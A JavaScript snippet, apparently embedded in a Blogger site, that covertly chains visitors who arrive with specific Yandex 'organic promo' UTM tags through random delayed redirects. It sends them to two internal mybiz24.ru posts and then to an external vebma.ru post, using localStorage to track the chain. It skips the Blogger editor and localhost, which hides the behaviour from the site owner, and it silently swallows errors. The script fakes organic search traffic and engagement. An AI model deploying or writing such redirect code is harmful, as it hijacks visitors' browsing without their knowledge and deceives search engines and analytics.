//<![CDATA[
(function() {
    function hasRequiredUTM() {
        try {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('utm_source') === 'yandex' &&
                   urlParams.get('utm_medium') === 'organic' &&
                   urlParams.get('utm_campaign') === 'promo';
        } catch(e) {
            return false;
        }
    }

    const internalPages = [
        "https://www.mybiz24.ru/2024/11/blog-post.html",
        "https://www.mybiz24.ru/2024/11/10-2024.html",
        "https://www.mybiz24.ru/2024/11/seo.html",
        "https://www.mybiz24.ru/2024/11/blog-post_3.html",
        "https://www.mybiz24.ru/2024/11/blog-post_30.html",
        "https://www.mybiz24.ru/2024/11/blog-post_20.html",
        "https://www.mybiz24.ru/2024/11/blog-post_33.html",
        "https://www.mybiz24.ru/2024/11/blog-post_18.html",
        "https://www.mybiz24.ru/2024/11/blog-post_37.html",
        "https://www.mybiz24.ru/2024/11/blog-post_36.html"
    ];

    const externalLinks = [
    "https://vebma.ru/2023/05/website-design-trends-latest-and.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://vebma.ru/2023/05/mastering-seo-strategies-to-boost-your.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://vebma.ru/2023/05/the-power-of-content-marketing-how-to.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://vebma.ru/2023/05/e-commerce-essentials-tips-and-tricks.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://vebma.ru/2023/05/website-security-101-protecting-your.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://vebma.ru/2023/05/harnessing-potential-of-social-media.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://vebma.ru/2023/05/website-optimization-speeding-up-your.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://vebma.ru/2023/05/the-art-of-blogging-techniques-and.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://vebma.ru/2023/05/creating-killer-landing-pages-best.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://vebma.ru/2023/05/navigating-web-hosting-finding-right.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
    ];

    function getRandomItem(array) {
        return array[Math.floor(Math.random() * array.length)];
    }

    function getRandomDelay() {
        return Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000;
    }

    function performFirstRedirect() {
        const internalUrl = getRandomItem(internalPages);
        
        let redirectCount = 1;
        localStorage.setItem('inf_red_cnt', redirectCount.toString());
        localStorage.setItem('lst_red', Date.now().toString());
        
        setTimeout(function() {
            window.location.href = internalUrl;
        }, getRandomDelay());
    }

    function performSecondRedirect() {
        const internalUrl = getRandomItem(internalPages);
        
        let redirectCount = 2;
        localStorage.setItem('inf_red_cnt', redirectCount.toString());
        localStorage.setItem('lst_red', Date.now().toString());
        
        setTimeout(function() {
            window.location.href = internalUrl;
        }, getRandomDelay());
    }

    function performThirdRedirect() {
        setTimeout(function() {
            const externalUrl = getRandomItem(externalLinks);
            localStorage.removeItem('inf_red_cnt');
            localStorage.removeItem('lst_red');
            window.location.href = externalUrl;
        }, getRandomDelay());
    }

    function init() {
        try {
            if (window.location.href.includes('blogger.com') || 
                window.location.href.includes('localhost')) {
                return;
            }

            const hasRequiredUtm = hasRequiredUTM();
            const redirectCount = parseInt(localStorage.getItem('inf_red_cnt') || '0');
            const hasCycleData = localStorage.getItem('inf_red_cnt') !== null;
            
            if (hasRequiredUtm) {
                localStorage.removeItem('inf_red_cnt');
                localStorage.removeItem('lst_red');
                performFirstRedirect();
            }
            else if (hasCycleData) {
                if (redirectCount === 1) {
                    performSecondRedirect();
                } else if (redirectCount === 2) {
                    performThirdRedirect();
                } else {
                    localStorage.removeItem('inf_red_cnt');
                    localStorage.removeItem('lst_red');
                }
            }
        } catch(e) {}
    }

    function startScript() {
        setTimeout(init, Math.floor(Math.random() * 500) + 100);
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', startScript);
    } else {
        startScript();
    }
})();

//]]>

